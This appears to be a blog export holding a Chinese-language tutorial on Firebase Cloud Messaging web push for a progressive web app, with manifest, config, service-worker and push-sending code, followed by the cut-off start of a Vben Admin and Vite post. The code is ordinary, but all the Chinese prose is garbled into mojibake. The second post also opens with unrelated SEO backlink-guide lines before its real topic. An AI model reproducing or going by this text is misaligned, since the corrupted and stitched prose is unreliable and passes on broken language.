ä¸Šé–‹ä¸€å€‹å°ˆæ¡ˆã€‚\nä»¥ä¸‹æˆªåœ–æ‰€ç”¨åˆ°çš„ Firebase å°ˆæ¡ˆä¹‹å¾Œæœƒåˆªæ‰ï¼Œå„ç¨®é‡‘é‘°æœ€å¾Œéƒ½ä¸æœƒå­˜åœ¨ï¼Œç´”ç¤ºç¯„ç”¨ã€‚\né–‹å®Œå°ˆæ¡ˆå¾Œï¼Œè¦å–å¾—æ¨æ’­é‡‘é‘°ï¼Œæœ‰äº†é‡‘é‘°æ‰èƒ½å§‹ç”¨ FCM çš„åŠŸèƒ½ã€‚\né¦–å…ˆé€²åˆ° Firebase å¾Œå°ï¼Œé»é¸é½’è¼ªå¾Œï¼Œå†é»é¸å°ˆæ¡ˆè¨­å®šï¼š\né»æ“Š Cloud Messagingï¼š\né é¢å¾€ä¸‹æ‹‰ï¼Œæœƒçœ‹åˆ°ä¸€å€‹ã€Œç¶²è·¯è¨­å®šã€çš„å€å¡Šï¼Œæœ‰ä¸€å€‹ã€Œç”¢ç”Ÿé‡‘é‘°çµ„ã€çš„æŒ‰é‡‘ï¼ŒæŒ‰ä¸‹å»ï¼š\nå°±æœƒç”¢ç”Ÿä¸€çµ„ Web Push ç”¨çš„é‡‘é‘°ï¼Œå…ˆå­˜ä¸‹ä¾†ï¼ŒFirebase Config è£¡æœƒç”¨åˆ°ï¼š\næ–°å¢ manifest.jsonã€Firebase Config å–å¾—é‡‘é‘°å¾Œï¼Œç¬¬äºŒæ­¥å°±æ˜¯æ–°å¢ä¸€å€‹ manifest.json çš„æª”æ¡ˆï¼Œæª”æ¡ˆå…§å®¹å¤§æ¦‚å¦‚ä¸‹ï¼š\nmanifest.json 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 { \u0026#34;short_name\u0026#34;: \u0026#34;XXX\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;XXXXXX\u0026#34;, \u0026#34;icons\u0026#34;: [ { \u0026#34;src\u0026#34;: \u0026#34;./logo/logo192.png\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;image/png\u0026#34;, \u0026#34;sizes\u0026#34;: \u0026#34;192x192\u0026#34; }, { \u0026#34;src\u0026#34;: \u0026#34;./logo/logo512.png\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;image/png\u0026#34;, \u0026#34;sizes\u0026#34;: \u0026#34;512x512\u0026#34; }, { \u0026#34;src\u0026#34;:\u0026#34;./logo/maskable_icon.webp\u0026#34;, \u0026#34;sizes\u0026#34;: \u0026#34;512x512\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;image/webp\u0026#34;, \u0026#34;purpose\u0026#34;: \u0026#34;any maskable\u0026#34; } ], \u0026#34;start_url\u0026#34;: \u0026#34;/\u0026#34;, \u0026#34;background_color\u0026#34;: \u0026#34;#ffffff\u0026#34;, \u0026#34;display\u0026#34;: \u0026#34;standalone\u0026#34;, \u0026#34;scope\u0026#34;: \u0026#34;/\u0026#34;, \u0026#34;theme_color\u0026#34;: \u0026#34;#000000\u0026#34;, \u0026#34;gcm_sender_id\u0026#34;: \u0026#34;103953800507\u0026#34; } æœ€é‡è¦çš„æ˜¯é€™ä¸€è¡Œï¼š\n1 \u0026#34;gcm_sender_id\u0026#34;: \u0026#34;103953800507\u0026#34; é€™è¡Œä¸€å®šè¦æœ‰ï¼Œkeyã€value æ˜¯å›ºå®šçš„ï¼Œcopy è²¼ä¸Šå°±è¡Œã€‚\nFirebase Config å»ºç«‹ä¸€å€‹é¦–é çš„æª”æ¡ˆ index.htmlï¼Œåœ¨é å°¾çš„éƒ¨ä»½å¼•ç”¨ Firebase Configã€‚\nFirebase Config ä¸€æ¨£æ˜¯å¾Œå°æœ‰æä¾›ï¼Œé»å°é½’è¼ªï¼Œå†é»å°ˆæ¡ˆè¨­å®šå¾Œï¼Œæ¥è‘—é»ä»£è¡¨ Web çš„é‚£å€‹æŒ‰éˆ•ï¼š\nå°±æœƒå‡ºç¾ Config äº†ï¼š\ncopy ä»¥å¾Œè²¼åˆ° index.htmlï¼Œå¦å¤–ä¹Ÿä¸€ä½µè²¼ä¸Š FCM çš„å¼•ç”¨ï¼Œæ•´åˆå¾Œå¦‚ä¸‹ï¼š\nfcm-web-push-firebase-config.html 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 \u0026lt;script src=\u0026#34;https://www.gstatic.com/firebasejs/5.9.1/firebase.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script\u0026gt; var config = { apiKey: \u0026#34;XXXXXXXXXX\u0026#34;, authDomain: \u0026#34;XXXXXXXXXX.firebaseapp.com\u0026#34;, databaseURL: \u0026#34;https://XXXXXXXXXX.firebaseio.com\u0026#34;, projectId: \u0026#34;XXXXXXXXXX\u0026#34;, storageBucket: \u0026#34;XXXXXXXXXX.appspot.com\u0026#34;, messagingSenderId: \u0026#34;XXXXXXXXXX\u0026#34; }; firebase.initializeApp(config); var database = firebase.database(); var messaging = firebase.messaging(); messaging.usePublicVapidKey(\u0026#39;XXXXXXXXXXXXXXXXXXXX\u0026#39;); \u0026lt;/script\u0026gt; æœ€å¾Œä¸€è¡Œçš„ï¼š\n1 messaging.usePublicVapidKey(\u0026#39;XXXXXXXXXXXXXXXXXXXX\u0026#39;); XXX å°±æ˜¯è¦æ›¿æ›æˆç¬¬ä¸€æ­¥æ‹¿åˆ°çš„ FCM é‡‘é‘°ã€‚\nå–å¾—ä½¿ç”¨è€…çš„ token ç°¡å–®ä¾†èªªï¼ŒWeb Push æ¨æ’­åŠŸèƒ½çš„æµç¨‹å¦‚ä¸‹ï¼š\nè¨»å†Š service-worker â†’ å‘ä½¿ç”¨è€…è¦æ±‚å…è¨±é€šçŸ¥æ¬Šé™ â†’ FCM ç”¢ç”Ÿé€™å€‹è£ç½®çš„ token â†’ token å¯«é€²è³‡æ–™åº« â†’ å¾å¾Œå°ä½¿ç”¨ Web Push â†’ Server ç™¼ Web Push åˆ°è£ç½®ä¸Š â†’ è£ç½®ä¸Šçš„ service worker æ¥æ”¶ â†’ service worker åŸ·è¡Œ notification token æ˜¯æ¯ä¸€å€‹è£ç½®æœƒæœ‰çš„ï¼Œä¹‹æ‰€ä»¥æœƒä»¥è£ç½®ç‚ºå–®ä½ï¼Œè€Œä¸æ˜¯ä»¥ä½¿ç”¨è€…ç‚ºå–®ä½ï¼Œæ˜¯å› ç‚ºæ¯ä¸€å€‹è£ç½®éƒ½å¯ä»¥è¨»å†Šservice workerï¼Œè€Œä¸”æ¯æ¬¡å­˜çš„ token éƒ½æœƒä¸åŒï¼Œæ‰€ä»¥ä¸€å€‹ä½¿ç”¨è€…åœ¨æ¡Œæ©Ÿçš„ Chromeã€Fireoxï¼Œæˆ–æ˜¯å®‰å“æ‰‹æ©Ÿçš„Chromeã€Firefoxï¼Œéƒ½æœ‰ä¸åŒçš„ tokenã€‚\nå‡è¨­ç‹å°æ˜åœ¨æ¡Œæ©Ÿçš„ Chromeã€Firefoxï¼Œéƒ½æŒ‰ä¸‹äº†å…è¨±é€šçŸ¥ï¼Œåœ¨å®‰å“æ‰‹æ©Ÿçš„ Chromeã€Firefox ä¹ŸæŒ‰äº†å…è¨±é€šçŸ¥ï¼Œé‚£ç•¶æˆ‘å€‘æŒ‰ä¸‹ç™¼é€æ¨æ’­å¾Œï¼Œç‹å°æ˜å°±æœƒåœ¨ 4 å€‹åœ°æ–¹æ”¶åˆ°ç›¸åŒçš„é€šçŸ¥ã€‚å› ç‚ºæ˜¯ç”¨è£ç½®ä¾†å€åˆ†çš„ã€‚\nIOS ç›®å‰é‚„ä¸æ”¯æ´ Web Pushã€‚\n2020.04.10æ›´æ–°ï¼š\nä»Šå¤©çœ‹åˆ° iZooto çš„ ä¸€ç¯‡æ–‡ç«  ä¸Šå¯«ï¼Œåœ¨æ¯”å°äº†ä¸€ä¸‹ Can I Use ä¸­çš„ service workers æ”¯æ´æƒ…æ³ï¼Œå¯ä»¥çœ‹åˆ° IOS11.3 é–‹å§‹æ”¯æ´ Service Workers äº†ï¼Œä½† Web Push çš„åŠŸèƒ½åªæ”¯æ´åœ¨ MACï¼Œå°šæœªæ”¯æ´åˆ° iPhone ä¸Šã€‚\næ–°å¢ sw.js ç”¨ Workbox æ–°å¢ä¸€å€‹ sw.js æª”æ¡ˆï¼ŒæŠŠ Firebase çš„ Config æ”¾é€²å»ï¼Œç¨‹å¼ç¢¼å¦‚ä¸‹ï¼š\nfcm-web-push-sw1.js 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 importScripts(\u0026#34;https://storage.googleapis.com/workbox-cdn/releases/3.6.3/workbox-sw.js\u0026#34;); importScripts(\u0026#39;https://www.gstatic.com/firebasejs/5.7.0/firebase-app.js\u0026#39;); importScripts(\u0026#39;https://www.gstatic.com/firebasejs/5.7.0/firebase-messaging.js\u0026#39;); workbox.clientsClaim(); workbox.skipWaiting(); workbox.precaching.precacheAndRoute([ // è¦å¿«å–çš„æª”æ¡ˆ ]); // firebase config var config = { apiKey: \u0026#34;XXXXXXXXXX\u0026#34;, authDomain: \u0026#34;XXXXXXXXXX.firebaseapp.com\u0026#34;, databaseURL: \u0026#34;https://XXXXXXXXXX.firebaseio.com\u0026#34;, projectId: \u0026#34;XXXXXXXXXX\u0026#34;, storageBucket: \u0026#34;XXXXXXXXXX.appspot.com\u0026#34;, messagingSenderId: \u0026#34;XXXXXXXXXX\u0026#34; }; firebase.initializeApp(config); var messaging = firebase.messaging(); å¦‚æœæ¨æ’­è£¡è¦æ”¾å…¬å¸çš„ Logoï¼Œé‚£ Logo çš„åœ–æª”å°±è¦å¯«é€²å¿«å–æª”æ¡ˆçš„æ¸…å–®è£¡ï¼Œåˆ°æ™‚æ¨æ’­æ‰æœ‰åœ–æª”å¯ä»¥é¡¯ç¤ºã€‚\nè¨»å†Š sw.jsã€å­˜ Cookiesã€å­˜ Firebase å¦‚æœæ‹¿åˆ°çš„ token ä¸å­˜åœ¨ Cookies è£¡ï¼Œç”¨ Cookies åˆ¤æ–·æ˜¯å¦æ‹¿é tokenï¼Œé‚£ä½¿ç”¨è€…å°±æœƒå­˜åˆ° 2 çµ„ä»¥ä¸Šçš„ tokenï¼Œåœ¨ç™¼æ¨æ’­æ™‚ï¼Œå°±æœƒæ”¶åˆ°ç›¸åŒçš„è¨Šæ¯å¤šæ¬¡ã€‚\nç•¶ç„¶ï¼Œå¦‚æœä½¿ç”¨è€…æ¸…é™¤äº†å¿«å–ï¼Œå°±æœƒæœ‰åˆ¥ç¨®æƒ…æ³ç™¼ç”Ÿï¼Œæœ€å¥½çš„æ–¹å¼é‚„æ˜¯è®“ä½¿ç”¨è€…ç™»å…¥æœƒå“¡å¾Œï¼Œå†å–å¾— tokenï¼ŒæŠŠ token è·Ÿæœƒå“¡ç¶ä¸€èµ·ï¼Œå°±ä¸æœƒæœ‰å¥‡å¥‡æ€ªæ€ªçš„æƒ…å½¢å‡ºç¾ã€‚\nä»¥ä¸‹ç‚º JS codeï¼š\nfcm-web-push-get-token.js 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 window.addEventListener(\u0026#39;load\u0026#39;, function() { if(\u0026#39;serviceWorker\u0026#39; in navigator) { navigator.serviceWorker.register(\u0026#39;/sw.js\u0026#39;) .then(function(reg) { // firebase methodsï¼Œç”¨åŒä¸€æ”¯sw.js messaging.useServiceWorker(reg); }) // è¨»å†Šå¤±æ•— .catch(function(err) { console.log(\u0026#39;error: \u0026#39;, err); }); } messaging.requestPermission().then(function() { // å…ˆåˆ¤æ–·cookiesæœ‰æ²’æœ‰tokenï¼Œæ²’æœ‰å†å–token var ckv = document.cookie.replace(/(?:(?:^|.*;\\\\s*)augustusWsPush\\s*\\=\\s*([^;]*).*$)|^.*$/, \u0026#34;$1\u0026#34;) || null; // cookiesä¸å­˜åœ¨ï¼Œè·Ÿä½¿ç”¨è€…è¦æ±‚é€šçŸ¥æ¬Šé™ if(ckv === null) { // æ‹¿åˆ°tokenï¼Œfirebase-messaging-sw.js å°±æœƒå­˜ Service Workers è£¡ messaging.getToken().then(function(currentToken) { // tokenå­˜è‡³firebase var id = currentToken.split(\u0026#39;:\u0026#39;)[0]; firebase.database().ref(\u0026#39;pushUsers/\u0026#39; + id).set({\u0026#39;token\u0026#39;: currentToken}); // tokenå­˜è‡³cookies document.cookie = \u0026#34;augustusWsPush=\u0026#34; + currentToken; }); } // cookies å·²å­˜åœ¨ï¼Œå¾ cookies å–å‡ºå¾Œå‚³è‡³ firebase else { var id = ckv.split(\u0026#39;:\u0026#39;)[0]; firebase.database().ref(\u0026#39;pushUsers/\u0026#39; + id).set({\u0026#39;token\u0026#39;: ckv}); } }).catch(function(err) { console.log(\u0026#39;ä½¿ç”¨è€…æœªå…è¨±é€šçŸ¥\u0026#39;, err); }); }); è£¡é¢æœ‰ä¸€è¡Œå¾ˆé‡è¦ï¼š\n1 messaging.useServiceWorker(xxx); é€™æ˜¯é€™æ¬¡è¸©åˆ°çš„å‘ã€‚\nå¦‚æœæ²’å¯«é€™è¡Œï¼Œå°±æœƒç™¼ç¾ç¶²ç«™å­˜äº† 2 å€‹ service workerï¼Œåˆ†åˆ¥æ˜¯ Firebase çš„ï¼Œä»¥åŠæˆ‘å€‘è‡ªå·±çš„ã€‚é€™è¡Œå¯ä»¥è®“ FCM åªå­˜æˆ‘å€‘è¨»å†Šçš„ sw.jsï¼Œæ‰å¯ä»¥åœ¨ç”¨ FCM æ¨æ’­æ™‚ï¼Œé †åˆ©çš„åŸ·è¡Œæ¨æ’­åŠé»æ“Šå¾Œé–‹å•ŸæŒ‡å®šçš„é é¢ã€‚\næˆåŠŸçš„è©±ï¼Œé–‹å•Ÿ index.htmlï¼Œåœ¨é–‹ç™¼äººå“¡å·¥å…·çš„ Application â†’ Service Workersï¼Œå°±æœƒçœ‹è¦‹è¨»å†Šäº† sw.js æª”æ¡ˆï¼š\nè¨»å†Š sw.js åªèƒ½åœ¨ https ä¸‹ï¼Œå› æ­¤ç¶²åŸŸå¿…é ˆæœ‰S SLï¼Œä¸ç„¶æœƒè¨»å†Šå¤±æ•—ã€‚\n1 messaging.requestPermission() é€™è¡Œæœƒè·Ÿä½¿ç”¨è€…è¦å…è¨±é€šçŸ¥ï¼Œä½¿ç”¨è€…æŒ‰ä¸‹å…è¨±å¾Œ\n1 messaging.requestPermission() é€™è¡Œå°±æœƒç”¢ç”Ÿ FCM çš„ tokenï¼Œä¹‹å¾Œå°±æ˜¯å­˜é€² Firebase è·Ÿ Cookiesã€‚\nFirebase ä¸Šæœƒçœ‹åˆ°ä»¥ä¸‹ï¼š\nä¹‹å¾Œåªè¦è·‘å€‹è¿´åœˆï¼Œå°±å¯ä»¥ä¸€å€‹å€‹å»ç™¼é€ Web Pushã€‚\nç™¼é€ Web Push é€™é‚Šæ–°å¢ä¸€å€‹ admin.html ä¾†ç•¶åšç™¼é€ Web Push çš„å¾Œå°ä»‹é¢ï¼Œç›´æ¥ç”¨ Vue.js æŠ“æ¯å€‹ input çš„å€¼ã€‚\nWeb Push å¦‚æœè¦åˆ¤æ–·æˆæ•ˆï¼Œç›´æ¥ç”¨ Google Analytics çš„ utm åƒæ•¸å°±å¯ä»¥äº†ï¼Œæ‰€ä»¥å¾Œå°æ¬„ä½æœ‰çµ¦ utm ç”¨çš„ 3 å€‹ä¸»è¦åƒæ•¸ã€‚\nä¸å«æ¨£å¼çš„åŸå§‹ç¢¼æ–‡æœ«æœƒé™„ä¸Š GitHub ç¶²å€ã€‚\nåœ¨ç™¼é€ Web Push æ™‚ï¼Œé‚„è¦å¡«å…¥ä¼ºæœå™¨çš„é‡‘é‘°ï¼Œé€™ä¹Ÿæ˜¯å¾ Firebase å¾Œå°å¯ä»¥æ‹¿åˆ°ã€‚é»å°é½’è¼ª â†’ å°ˆæ¡ˆè¨­å®š â†’ Cloud Messagingï¼Œç¬¬ä¸€å€‹ã€Œä¼ºæœå™¨é‡‘é‘°ã€çš„å€¼å°±æ˜¯äº†ï¼š\nç™¼é€ Web Push çš„ JS å¦‚ä¸‹ï¼Œå¯«åœ¨ admin.html è£¡ï¼š\nfcm-web-push-trigger.js 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 var notification = { \u0026#39;title\u0026#39;: \u0026#39;web pushæ¨™é¡Œ\u0026#39;, \u0026#39;body\u0026#39;: \u0026#39;web pushå…§æ–‡\u0026#39;, \u0026#39;badge\u0026#39;: \u0026#39;logoåœ–æª”è·¯å¾‘\u0026#39;, \u0026#39;icon\u0026#39;: \u0026#39;logoåœ–æª”è·¯å¾‘\u0026#39;, \u0026#39;click_action\u0026#39;: \u0026#39;https://www.domain.com.tw\u0026#39;, \u0026#39;data\u0026#39;: { \u0026#39;url\u0026#39;: \u0026#39;https://www.domain.com.tw\u0026#39; } }; fetch(\u0026#39;https://fcm.googleapis.com/fcm/send\u0026#39;, { \u0026#39;method\u0026#39;: \u0026#39;POST\u0026#39;, \u0026#39;headers\u0026#39;: { \u0026#39;Authorization\u0026#39;: \u0026#39;key=å¾firebaseä¸Šå–å¾—ä¼ºæœå™¨é‡‘é‘°\u0026#39;, \u0026#39;Content-Type\u0026#39;: \u0026#39;application/json\u0026#39; }, \u0026#39;body\u0026#39;: JSON.stringify({ \u0026#39;data\u0026#39;: notification, \u0026#39;to\u0026#39;: \u0026#39;ä½¿ç”¨è€…çš„token\u0026#39;, }) }).then(function(response) { console.log(response); }).catch(function(error) { alert(error); }); æ¥æ”¶ Web Push æ¥å— Web Push æœ‰ 2 ç¨®æƒ…æ³ï¼š\nä½¿ç”¨è€…æ­£é–‹å•Ÿå®˜ç¶²é é¢ ä½¿ç”¨è€…æ²’æœ‰é–‹å•Ÿå®˜ç¶²é é¢ ç¬¬ä¸€ç¨®æƒ…æ³ï¼Œæ˜¯åœ¨ index.js ä¸‹å¯«ä¸€å€‹ messaging.onMessage çš„ function è™•ç†ã€‚\nç¬¬äºŒç¨®æƒ…æ³ï¼Œæ˜¯åœ¨ sw.js ä¸‹å¯«ä¸€å€‹ messaging.setBackgroundMessageHandler çš„ function è™•ç†ã€‚\nä½¿ç”¨è€…æ­£é–‹å•Ÿå®˜ç¶²é é¢ å®˜ç¶²æ­£é–‹å•Ÿçš„ç‹€æ³ä¸‹ï¼Œå±¬æ–¼ JS çš„ notification åŠŸèƒ½ï¼Œfunction ç¯„ä¾‹å¦‚ä¸‹ï¼š\nfcm-web-push-notification.js 1 2 3 4 5 6 7 8 9 10 11 messaging.onMessage(function(payload) { var msgTitle = payload.data.title; var url = payload.data.click_action; var notification = new Notification(msgTitle, payload.data); // é»æ“Šæ¨æ’­å¾Œè¦é€£å»å“ª notification.addEventListener(\u0026#39;click\u0026#39;, function() { e.preventDefault(); location.href = url; }); }); payload å°±æ˜¯å‚³ä¾†çš„å€¼ï¼Œé»æ“Šå¾Œè¦å°åˆ°çš„é é¢å°±ç”¨ location.href ä¾†è™•ç†ã€‚\nä½¿ç”¨è€…æ²’æœ‰é–‹å•Ÿå®˜ç¶²é é¢ ä½¿ç”¨è€…åœ¨ä¸Šç¶²ï¼Œä½†æ²’æœ‰é–‹å•Ÿå®˜ç¶²çš„é é¢ï¼Œå°±æ˜¯ç”±ä¹‹å‰è¨»å†Šçš„ sw.js è™•ç†ï¼Œåœ¨ sw.js åŠ å…¥ä»¥ä¸‹ï¼š\nfcm-web-push-sw2.js 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 var click_action; // ç›£è½notifictioné»æ“Šäº‹ä»¶ self.addEventListener(\u0026#39;notificationclick\u0026#39;, function(event) { var url = click_action; event.notification.close(); event.waitUntil( clients.matchAll({ type: \u0026#39;window\u0026#39; }).then(windowClients =\u0026gt; { // å¦‚æœtabæ˜¯é–‹è‘—çš„ï¼Œå°± focus é€™å€‹tab for (var i = 0; i \u0026lt; windowClients.length; i++) { var client = windowClients[i]; if(client.url === url \u0026amp;\u0026amp; \u0026#39;focus\u0026#39; in client) { return client.focus(); } } // å¦‚æœæ²’æœ‰ï¼Œå°±æ–°å¢tab if(clients.openWindow) { return clients.openWindow(click_action); } }) ); }); // FCM messaging.setBackgroundMessageHandler(function(payload) { var data = payload.data; var title = data.title; var options = { body: data.body, icon: \u0026#39;/logo/logo192.png\u0026#39;, badge: \u0026#39;/logo/logo192.png\u0026#39; }; click_action = data.click_action; return self.registration.showNotification(title, options); }); click_action æ˜¯é»æ“Šå¾Œè¦é–‹å•Ÿçš„é é¢ç¶²å€ï¼Œä½†è¦å¦å¤–å¯«ä¸€å€‹ notificationclick ä¾†è™•ç†ã€‚\né€™é‚Šè¸©äº†ä¸€å€‹å‘ï¼Œå¦‚æœæŒ‰ç…§ä¸€èˆ¬é †åºä¾†å¯«ï¼Œæœƒå…ˆå¯«äº† messaging.setBackgroundMessageHandler å¾Œï¼Œå†å¯« notificationclickã€‚ç„¶å¾Œå°±æœƒç™¼ç¾ï¼ŒChrome ä¸Šå¯ä»¥æ­£å¸¸é‹ä½œï¼Œä½†åœ¨ Firefox ä¸Šæ€éº¼é»å°±æ˜¯ä¸æœƒé–‹å•Ÿé é¢ã€‚\nGoogle äº†å¾ˆä¹…ï¼Œæ‰çœ‹åˆ°é€™ç¯‡ï¼šservice worker notificationclick event doesnâ€™t focus or open my website in tab\nclick_action æ˜¯ Chrome ç”¨çš„ï¼Œå¦‚æœ messaging.setBackgroundMessageHandler å…ˆå¯«äº†ï¼Œé‚£ FCM å°±æœƒå…¨éƒ¨æ¥æ”¶ Web Push çš„åŠŸèƒ½ï¼Œå°±ä¸æœƒè®“åŸç”Ÿçš„ notificationclick äº‹ä»¶è¢«é‹ä½œï¼Œå› æ­¤ notificationclick å¾—å¯«åœ¨å‰ï¼Œè®“åŸç”Ÿäº‹ä»¶é‹ä½œå¾Œï¼Œå†åŸ·è¡Œ FCM çš„äº‹ä»¶ã€‚\nè£œå……è³‡æº æœ‰äº†ç™¼é€ã€æ¥æ”¶ï¼ŒåŸºæœ¬ä¸Š Web Push å°±å¯ä»¥é †åˆ©é‹ä½œäº†ã€‚\nè¦æ³¨æ„çš„æ˜¯ Web Push åªæ¥å—åœ¨ https ä»¥ä¸‹é‹è¡Œã€‚\næœ€å¾Œé™„ä¸Šå­¸ç¿’æ™‚åƒè€ƒçš„æ•™å­¸æ–‡ï¼Œä»¥åŠæœ¬ç¯‡çš„ GitHub åŸå§‹ç¢¼ã€‚\nå¾å»º Firebase å°±é–‹å§‹æ•™å­¸çš„ï¼ˆè‹±æ–‡ï¼‰ï¼šTutorial: Web Push notification using Firebase\nå»ºç«‹ Service Worker Web Push Notification â€” (Firebase Push Notificationå¯¦ä½œç´€éŒ„)\nPush Notificationä¹‹æˆç‚ºè¨‚é–±ç”¨æˆ¶(Firebaseå¯¦ä½œ)\nGoogle å®˜æ–¹æ•™å­¸çš„åŸå§‹ç¢¼ï¼šGitHub\nGoogle å®˜æ–¹æ•™å­¸çš„åŠŸèƒ½ç¤ºç¯„ï¼šNotification Examples\n","date":"2022-10-19T00:00:00Z","image":"https://live.staticflickr.com/65535/52438994804_33f71b7e35_o.jpg","permalink":"https://wayneblog.ga/2022-10-19/web-pwa/","title":"å°‡ç¶²é è®ŠæˆProgressive Web Application(PWA)ï¼Œæ¼¸é€²å¼çš„ç¶²é æ‡‰ç”¨ç¨‹å¼"},{"content":" åƒè€ƒç¶²ç«™\nåƒè€ƒç¶²ç«™\né€™æ˜¯ä¸€ç¯‡å®Œæ•´çš„ 2022 å¹´é€£çµå„ªåŒ–æŒ‡å—ã€‚\nå› æ­¤ï¼Œå¦‚æœä½ æƒ³è¦å–å¾—æ¬Šå¨ç¶²ç«™çš„åå‘é€£çµã€‚\nä½ å°‡æœƒåœ¨é€™ç¯‡æ–°æŒ‡å—ä¸­ï¼Œäº«å—æœ¬æ–‡å¯æ“ä½œçš„æŠ€å·§ã€‚\nè®“æˆ‘å€‘å¾€æ·±å…¥å…¶ä¸­å§ã€‚\nVben Admin é»æˆ‘è·³é Vben Adminï¼Œç›´æ¥å‰å¾€é…ç½®Vite\nä»‹ç´¹ Vue-Vben-Admin æ˜¯ä¸€å€‹åŸºæ–¼ Vue3.0ã€Viteã€Ant-Design-Vueã€TypeScript çš„å¾Œå°è§£æ±ºæ–¹æ¡ˆï¼Œç›®æ¨™æ˜¯ç‚ºé–‹ç™¼ä¸­å¤§å‹é …ç›®æä¾›é–‹ç®±å³ç”¨çš„è§£æ±ºæ–¹æ¡ˆã€‚åŒ…æ‹¬äºŒæ¬¡å°è£çµ„ä»¶ã€utilsã€hooksã€å‹•æ…‹èœå–®ã€æ¬Šé™æ ¡é©—ã€æŒ‰éˆ•ç´šåˆ¥æ¬Šé™æ§åˆ¶ç­‰åŠŸèƒ½ã€‚é …ç›®æœƒä½¿ç”¨å‰ç«¯è¼ƒæ–°çš„æŠ€è¡“æ£§ï¼Œå¯ä»¥ä½œç‚ºé …ç›®çš„å•Ÿå‹•æ¨¡ç‰ˆï¼Œä»¥å¹«åŠ©ä½ å¿«é€Ÿæ­å»ºä¼æ¥­ç´šä¸­å¾Œå°ç”¢å“åŸå‹ã€‚ä¹Ÿå¯ä»¥ä½œç‚ºä¸€å€‹ç¤ºä¾‹ï¼Œç”¨æ–¼å­¸ç¿’ vue3ã€viteã€ts ç­‰ä¸»æµæŠ€è¡“ã€‚è©²é …ç›®æœƒæŒçºŒè·Ÿé€²æœ€æ–°æŠ€è¡“ï¼Œä¸¦å°‡å…¶æ‡‰ç”¨åœ¨é …ç›®ä¸­ã€‚\næ–‡æª” ä¸­æ–‡æ–‡æª”åœ°å€ç‚º vben-admin-docï¼Œæ¡ç”¨ Vitepress é–‹ç™¼ã€‚ æœ¬åœ°é‹è¡Œæ–‡æª” å¦‚éœ€æœ¬åœ°é‹è¡Œæ–‡æª”ï¼Œè«‹æ‹‰å–ä»£ç¢¼åˆ°æœ¬åœ°ã€‚\n1 2 3 4 5 6 7 8 # æ‹‰å–ä»£ç¢¼ git clone https://github.com/vbenjs/vue-vben-admin-doc # å®‰è£ä¾è³´ yarn # é‹è¡Œé …ç›® yarn dev éœ€è¦æŒæ¡çš„åŸºç¤çŸ¥è­˜ æœ¬é …ç›®éœ€è¦ä¸€å®šå‰ç«¯åŸºç¤çŸ¥è­˜ï¼Œè«‹ç¢ºä¿æŒæ¡Vue çš„åŸºç¤çŸ¥è­˜ï¼Œä»¥ä¾¿èƒ½è™•ç†ä¸€äº›å¸¸è¦‹çš„å•é¡Œã€‚å»ºè­°åœ¨é–‹ç™¼å‰å…ˆå­¸ä¸€ä¸‹ä»¥ä¸‹å…§å®¹ï¼Œæå‰äº†è§£å’Œå­¸ç¿’é€™äº›çŸ¥è­˜ï¼Œæœƒå°é …ç›®ç†è§£éå¸¸æœ‰å¹«åŠ©ï¼š\nVue3 æ–‡æª” Vue-RFCS Vue2 é·ç§»åˆ° 3 TypeScript Vue-router Ant-Design-Vue ES6 Vitejs WindiCss æ¨¡ç‰ˆ vue-vben-admin (å®Œæ•´ç‰ˆæ¼”ç¤º) vue-vben-admin å®Œæ•´ç‰ˆæœ¬ã€‚è©²ç‰ˆæœ¬ä¸»è¦æ˜¯æä¾›ä¸€äº›Demoç¤ºä¾‹åŠæ’ä»¶çš„ä½¿ç”¨é›†æˆæ–¹å¼ï¼Œä¸»è¦ç”¨æ–¼åƒè€ƒã€‚å¦‚æœå°é …ç›®ä¸æ˜¯å¾ˆç†Ÿæ‚‰ï¼Œä¸å»ºè­°åœ¨æ­¤åŸºç¤ä¸Šé€²è¡Œé–‹ç™¼ï¼Œè«‹ä½¿ç”¨ä¸‹æ–¹æä¾›çš„ç²¾ç°¡ç‰ˆæœ¬ã€‚\nvue-vben-admin-thin (ç²¾ç°¡ç‰ˆæ¼”ç¤º) vue-vben-admin ç²¾ç°¡ç‰ˆæœ¬ã€‚åˆªé™¤äº†ç›¸é—œç¤ºä¾‹ã€ç„¡ç”¨æ–‡ä»¶åŠåŠŸèƒ½ã€ä¾è³´ã€‚å¯ä»¥æ ¹æ“šè‡ªèº«éœ€æ±‚å®‰è£å°æ‡‰çš„ä¾è³´ã€‚å› ç‚ºä½¿ç”¨çš„æ˜¯ viteï¼Œä¾è³´åˆªé™¤ä¸æœƒå°è‡´ç›¸é—œçµ„ä»¶æˆ–è€… hook ç™¼å‡ºè­¦å‘Šã€‚åªåœ¨éœ€è¦çš„æ™‚å€™å®‰è£å°æ‡‰çš„åº«å³å¯ã€‚\nvite æ’ä»¶æ¨è–¦ vite-plugin-mock - ç”¨æ–¼æœ¬åœ°åŠé–‹ç™¼ç’°å¢ƒæ•¸æ“š mock\nvite-plugin-html - ç”¨æ–¼ html æ¨¡ç‰ˆè½‰æ›ï¼Œå¯ä»¥åœ¨htmlæ–‡ä»¶å…§é€²è¡Œæ›¸å¯«æ¨¡ç‰ˆèªæ³•\nvite-plugin-style-import - ç”¨æ–¼çµ„ä»¶åº«æ¨£å¼æŒ‰éœ€å¼•å…¥\nvite-plugin-imagemin - ç”¨æ–¼æ‰“åŒ…å£“ç¸®åœ–ç‰‡è³‡æº\nvite-plugin-theme - ç”¨æ–¼åœ¨ç·šåˆ‡æ›ä¸»é¡Œè‰²/é»‘æš—ä¸»é¡Œé©é…ç­‰ä¸»é¡Œç›¸é—œé…ç½®\nvite-plugin-compression - 